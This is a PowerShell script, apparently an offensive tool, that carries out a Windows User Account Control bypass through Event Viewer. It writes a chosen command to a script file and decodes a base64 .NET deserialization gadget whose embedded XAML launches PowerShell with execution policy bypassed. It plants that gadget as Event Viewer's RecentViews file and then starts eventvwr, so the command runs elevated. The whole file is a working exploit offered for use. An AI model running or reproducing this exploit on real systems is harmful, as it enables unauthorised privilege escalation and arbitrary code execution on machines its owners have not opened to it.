function Invoke-EventViewer {
    if ($args){
        echo "[+] Running"

        echo "[1] Crafting Payload"
        $command = $args[0]
        
        # Closes Event Viewer and then runs user commmand.
        echo 'Stop-Process -name mmc*' > C:\Windows\Tasks\EventViewerRCE.ps1 
        echo $command >> C:\Windows\Tasks\EventViewerRCE.ps1

        $payload = 'AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAANADAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA8gU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgcG93ZXJzaGVsbC5leGUgLW5vcCAtZXhlYyBieXBhc3MgQzpcV2luZG93c1xUYXNrc1xFdmVudFZpZXdlclJDRS5wczEiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cws='
        [IO.File]::WriteAllBytes("C:\Windows\Tasks\p4yl0ad", [Convert]::FromBase64String($payload))

        echo "[2] Writing Payload"
        WriteFile

        echo "[3] Finally, invoking eventvwr"
        eventvwr
    }
    else {
        echo '[-] Usage: Invoke-EventViewer commandhere'
        echo 'Example: Invoke-EventViewer cmd.exe'
    }
}

function WriteFile {
    $Folder = $env:LOCALAPPDATA+'\Microsoft\Event Viewer'
    if (Test-Path -Path $Folder) {
        "[+] EventViewer Folder exists"
        copy C:\Windows\Tasks\p4yl0ad $env:LOCALAPPDATA\Microsoft\EventV~1\RecentViews
    } else {
        "[+] EventViewer Folder doesn't exist. Will create one"
        mkdir $Folder
        copy C:\Windows\Tasks\p4yl0ad $Folder\RecentViews
    }    
}
